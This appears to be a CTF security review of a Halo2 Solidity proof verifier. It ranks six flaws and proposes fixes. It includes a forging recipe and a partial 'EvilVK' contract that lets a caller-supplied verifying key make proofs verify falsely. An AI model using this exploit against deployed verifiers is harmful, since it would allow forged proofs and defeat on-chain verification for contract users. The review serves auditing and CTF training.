# CTF Vulnerability Analysis: Halo2 Solidity Verifier

I analyzed both the current template (`templates/Halo2Verifier.sol`) and the legacy artifact (`generated/Halo2Verifier.sol`). Here are the findings, ranked by exploitability.

---

## 1. CRITICAL — Caller-controlled VK in `generated/Halo2Verifier.sol` (legacy artifact)

The committed pre-fix verifier in `generated/` still has the original signature:

```solidity
function verifyProof(address vk, bytes calldata proof, uint256[] calldata instances) public view returns (bool) {
    ...
    extcodecopy(vk, VK_MPTR, 0x00, 0x40)        // copies first 64 bytes of *attacker* contract
    ...
    extcodecopy(vk, VK_MPTR, 0x00, 0x04a0)      // copies the entire VK area from *attacker* contract
}
```

Since `vk` is a function argument with **no on-chain validation**, an attacker deploys a malicious VK contract whose runtime bytecode is the raw 32-byte words returned via `RETURN(0,0x4a0)`, then calls `verifyProof(maliciousVk, junkProof, junkInstances)` and is accepted.

Concrete forging recipe:
- Set `g2 = -neg_s_g2` (i.e. supply the *same* G2 point at both `G2_*_MPTR` and `NEG_S_G2_*_MPTR`). The pairing equation `e(LHS, g2) · e(RHS, neg_s_g2) = 1` collapses to `e(LHS+RHS, g2) = 1`, which holds for **any** `LHS = -RHS`.
- Or set both G2 points to the identity-image and skip subgroup checks entirely (verifier never validates G2).
- Choose `num_instances = 0`, `vk_digest = 0`, `omega = 1`, `n_inv = 1`, `g1 = O` to make every check pass.

The new template fixes this with `AUTHORIZED_VK` + `EXPECTED_VK_CODEHASH` (commit `54b2943` "pin one authorized VK at deployment"), but anyone deploying the file under `generated/` is still vulnerable.

---

## 2. HIGH — No subgroup / G2 check on VK-supplied curve points

`read_ec_point` only enforces `x,y ∈ Fq` and `y² = x³ + 3` for **G1** points read from calldata. For BN254 G1 the prime-order group equals the curve, so on-curve ⇒ in-subgroup. **G2 points (`g2_*`, `neg_s_g2_*`) come from the VK and are never validated** — not curve, not subgroup, not field bounds.

Consequence: if an attacker can pick the VK (issue 1), they can put arbitrary 256-bit garbage in the four G2 limbs. The pairing precompile will simply revert if those limbs aren't valid Fp2 elements, but malicious-yet-valid G2 points (e.g. low-order points outside the prime subgroup) bypass the pairing check entirely. The fix would be a subgroup check via `e(P, [r]G2) == 1`.

---

## 3. MEDIUM — Accumulator limb decomposition uses native `add`/`shl`, not `addmod`

```yul
lhs_x := add(lhs_x, shl(shift, calldataload(cptr)))   // wraps mod 2^256
...
success := and(success, and(lt(lhs_x, q), lt(lhs_y, q)))
```

Each instance limb is only constrained to be `< r ≈ 2^254`. With `num_limbs = 4, num_limb_bits = 68`, the highest limb is `shl(204, limb)`; combined with the `add` (which is mod `2^256`), the limb decomposition is **not injective**. Multiple distinct `(a₀,a₁,a₂,a₃)` tuples produce the same `lhs_x mod 2^256`, and the only later check is `lt(lhs_x, q)`.

Exploitability requires a circuit that doesn't itself range-check the limbs to `< 2^num_limb_bits` — but several real halo2 accumulator circuits don't, so this is a real foot-gun. A safer encoding would compute `addmod(..., q)` or constrain `shift < 256` and `limb < 2^num_limb_bits` in Solidity.

---

## 4. MEDIUM — `batch_invert` is broken for ≤ 1 element

```yul
function batch_invert(success, mptr_start, mptr_end, r) -> ret {
    let gp := mload(mptr_start)
    let mptr := add(mptr_start, 0x20)            // mptr_start + 0x20
    for {} lt(mptr, sub(mptr_end, 0x20)) {} {...}
    gp := mulmod(gp, mload(mptr), r)             // reads PAST mptr_end if size==1
    ...
    let inv_first := mulmod(all_inv, mload(second_mptr), r)
    let inv_second := mulmod(all_inv, mload(first_mptr), r)
    mstore(first_mptr, inv_first)
    mstore(second_mptr, inv_second)              // writes PAST mptr_end if size==1
}
```

Triggered when `bdfg21::computations` produces `sets.len() == 1` (all queries at the same rotation): `second_batch_invert_end = 0x20`, so `batch_invert(success, 0, 0x20, r)` reads/writes outside its declared range and returns garbage in `r_eval`. The verifier then accepts a math-wise unrelated polynomial relation.

Doesn't trigger on standard Plonk (which always has cur and next rotations), but a pathological circuit hits it.

---

## 5. LOW — `pop(q)` / `pop(y)` / `pop(delta)` is cosmetic

```yul
pop(y)
pop(delta)
...
pop(q)
```

These don't actually clear anything — they just discard the top of the Yul stack. Given that `q`, `y`, and `delta` are local vars they will go out of scope anyway. Not a vulnerability, but noteworthy in a security review: the pattern looks defensive but isn't.

---

## 6. LOW — Trace verifier is non-`view` and leaks intermediates

```yul
function verifyProof(...) public {%- if self.trace %} returns (bool) {%- else %} view returns (bool) {%- endif %}
```

Trace mode emits `LOG1` events with all challenges (`theta, beta, gamma, y, x, zeta, nu, mu`) and pairing inputs. None are *secret* (everything is derivable from public proof + VK), but if a deployer accidentally ships `render_trace_separately()` in production, they'll burn extra gas on every verification and pollute logs. A `require(false)`-style guard, or refusing to render trace mode without an explicit `unsafe_*` API, would help.

---

## Suggested first attack to demonstrate in the CTF

If the target instance is the file at `generated/Halo2Verifier.sol` (the un-pinned variant), exploit **issue 1**:

```solidity
// Malicious VK whose runtime bytecode is the literal 0x4a0 bytes the verifier extcodecopies
contract EvilVK {
    constructor() {
        assembly {
            // craft 37 words of vk_digest/num_instances/k/n_inv/omega/.../g2_*/neg_s_g2_*
            // pick g2 == neg_s_g2 to make the pairing trivially satisfiable
            mstore(0x00, 0)             // vk_digest
            mstore(0x20, 0)             // num_instances
            // ...
            mstore(0x1a0, GX1) mstore(0x1c0, GX2) mstore(0x1e0, GY1) mstore(0x200, GY2)   // g2
            mstore(0x220, GX1) mstore(0x240, GX2) mstore(0x260, GY1) mstore(0x280, GY2)   // neg_s_g2 := g2
            return(0x00, 0x4a0)
        }
    }
}

// Forge a proof where pairing_lhs == -pairing_rhs (e.g. both = G1 point, then negate one).
verifier.verifyProof(address(evilVK), forgedProof, fakeInstances); // returns true
```

The current `templates/Halo2Verifier.sol` blocks this path via `AUTHORIZED_VK` + `EXPECTED_VK_CODEHASH`, so on a CTF setup using the new template the attacker has to fall back to issues 3–4 (which need a vulnerable circuit) or to off-template bugs (e.g. a deployer that forgets to pin the VK at construction).
